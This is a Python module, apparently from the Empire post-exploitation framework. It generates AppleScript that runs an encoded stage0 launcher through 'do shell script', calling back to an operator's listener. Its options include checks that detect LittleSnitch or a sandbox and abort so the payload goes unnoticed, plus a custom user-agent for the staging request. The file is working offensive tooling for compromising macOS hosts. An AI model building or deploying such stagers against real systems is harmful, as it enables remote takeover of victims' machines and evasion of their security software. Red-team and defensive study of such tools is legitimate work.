from lib.common import helpers


class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'AppleScript',

            'Author': ['@harmj0y'],

            'Description': ('Generates AppleScript to execute the Empire stage0 launcher.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'python'
            },
            'OutFile' : {
                'Description'   :   'File to output AppleScript to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, safeChecks=safeChecks)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""

        else:
            launcher = launcher.replace('"', '\\"')

            applescript = "do shell script \"%s\"" % (launcher)

            return applescript
